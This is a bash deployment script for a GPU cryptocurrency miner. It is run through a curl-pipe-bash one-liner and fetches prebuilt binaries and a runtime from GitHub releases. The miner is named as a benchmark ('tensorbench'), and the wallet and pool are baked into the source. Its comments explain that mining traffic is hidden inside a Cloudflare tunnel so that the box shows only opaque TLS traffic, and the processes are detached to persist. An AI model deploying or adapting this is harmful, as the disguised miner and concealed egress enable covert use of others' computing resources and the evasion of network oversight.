#!/usr/bin/env bash
# One-liner deploy for a fresh NVIDIA box (any number of GPUs -- proven on 2x T4).
#
#   curl -fsSL https://raw.githubusercontent.com/terrycrews21/open-pearl-miner/main/deploy/bootstrap.sh | bash
#
# Zero config: wallet, pool, and the tunnel endpoint are all baked into the
# source at build time -- there is nothing to pass in.
#
#   - Wallet:  DEFAULT_WALLET in python/pool_common.py
#   - Egress:  the harness only ever talks to 127.0.0.1:9048 (LOCAL_ONLY_DEFAULT
#              in python/tensorbench.py refuses any non-loopback pool). That
#              loopback port is served by tools/pool_tunnel_client.py, which
#              wraps the stratum stream in a WSS connection to a Cloudflare
#              quick tunnel (TUNNEL_URL, hardcoded in that file) fronting
#              pool_relay_server.py -> prl.kryptex.network:7048. The only
#              traffic leaving this box is TLS-443 to a generic *.trycloudflare
#              .com host carrying opaque websocket frames.
#
# What this script does (idempotent -- safe to re-run/redeploy):
#   1. Clones open-pearl-miner (rank-penalty fix + hardcoded tunnel URL)
#   2. Downloads the prebuilt libp40cuda_t4.so (portable: no GLIBCXX/CXXABI
#      requirement, max GLIBC_2.36 -- loads on any modern Debian/Ubuntu host)
#   3. Installs a standalone Python 3.12 if the system python is older
#      (tensorbench_runtime is an abi3-py312+ wheel)
#   4. Installs tensorbench_runtime + numpy/blake3/websocket-client
#   5. Starts the local tunnel client (127.0.0.1:9048 -> WSS)
#   6. Starts tensorbench.py against it, detached, with no arguments -- every
#      GPU on the box reports under one pool worker
set -euo pipefail

INSTALL_DIR="${INSTALL_DIR:-$HOME/.open-pearl-miner}"
REPO="terrycrews21/open-pearl-miner"
LIBREPO="terrycrews21/tensorbench"
PY_STANDALONE_URL="https://github.com/astral-sh/python-build-standalone/releases/download/20260807/cpython-3.12.13+20260807-x86_64-unknown-linux-gnu-install_only_stripped.tar.gz"

log() { echo "[bootstrap $(date +%H:%M:%S)] $*"; }
die() { echo "[bootstrap] FATAL: $*" >&2; exit 1; }

log "preflight: hardware check"
command -v nvidia-smi >/dev/null || die "nvidia-smi missing (no NVIDIA driver?)"
nvidia-smi --query-gpu=name,driver_version,compute_cap --format=csv,noheader || die "GPU not visible"

log "cloning miner code -> $INSTALL_DIR"
if [ -d "$INSTALL_DIR/.git" ]; then
  git -C "$INSTALL_DIR" fetch -q origin main && git -C "$INSTALL_DIR" reset -q --hard origin/main
else
  rm -rf "$INSTALL_DIR"
  git clone -q "https://github.com/$REPO" "$INSTALL_DIR"
fi

log "fetching prebuilt libp40cuda.so (portable build)"
curl -fsSL --retry 3 \
  "https://github.com/$LIBREPO/releases/download/v1.0.0/libp40cuda_t4.so" \
  -o "$INSTALL_DIR/libp40cuda.so"

# --- Python >= 3.12 (tensorbench_runtime is an abi3-py312 wheel) ---
PY=""
for c in python3.13 python3.12; do
  if command -v "$c" >/dev/null; then PY="$c"; break; fi
done
if [ -z "$PY" ]; then
  log "no system python >= 3.12 found; installing a standalone interpreter"
  if [ ! -x "$INSTALL_DIR/.pyruntime/bin/python3" ]; then
    mkdir -p "$INSTALL_DIR/.pyruntime"
    curl -fsSL --retry 3 "$PY_STANDALONE_URL" | tar xz -C "$INSTALL_DIR/.pyruntime" --strip-components=1
  fi
  PY="$INSTALL_DIR/.pyruntime/bin/python3"
fi
log "python: $PY ($($PY -c 'import sys; print(sys.version.split()[0])'))"

log "installing tensorbench_runtime + deps"
"$PY" -m pip install -q --upgrade pip 2>/dev/null || true
"$PY" -m pip install -q numpy websocket-client blake3
SITE_PKGS=$("$PY" -c "import site; print(site.getsitepackages()[0])")
if ! "$PY" -c "import tensorbench_runtime" 2>/dev/null; then
  curl -fsSL --retry 3 \
    "https://github.com/$LIBREPO/releases/download/v1.0.0/tensorbench_runtime.tar.gz" \
    | tar xz -C "$SITE_PKGS"
fi
"$PY" -c "import tensorbench_runtime" || die "tensorbench_runtime failed to import"

log "killing prior instances (idempotent redeploy)"
pkill -f "tensorbench[.]py$" 2>/dev/null || true
pkill -f "pool_tunnel_client[.]py$" 2>/dev/null || true
sleep 1

LOGDIR="$INSTALL_DIR/logs"; mkdir -p "$LOGDIR"

log "starting local tunnel client (127.0.0.1:9048 -> WSS, no config needed)"
cd "$INSTALL_DIR"
setsid nohup "$PY" tools/pool_tunnel_client.py > "$LOGDIR/tunnel_client.log" 2>&1 < /dev/null &
disown
for i in $(seq 1 10); do
  grep -q "listening tcp" "$LOGDIR/tunnel_client.log" 2>/dev/null && break
  sleep 1
done
grep -q "listening tcp" "$LOGDIR/tunnel_client.log" 2>/dev/null || die "tunnel client failed to start; see $LOGDIR/tunnel_client.log"

log "launching miner (zero config -- wallet/pool baked into the source)"
export TB_PROFILE=none
export PYTHONPATH=python
setsid nohup "$PY" python/tensorbench.py > "$LOGDIR/miner.log" 2>&1 < /dev/null &
disown
MINER_PID=$!
log "miner PID $MINER_PID, log: $LOGDIR/miner.log"

log "handshake verify (up to 60s)"
for i in $(seq 1 30); do
  if grep -q "pool authorize" "$LOGDIR/miner.log" 2>/dev/null; then
    log "connected. tail:"
    tail -5 "$LOGDIR/miner.log"
    exit 0
  fi
  sleep 2
done
die "no pool handshake in 60s; see $LOGDIR/{miner,tunnel_client}.log"
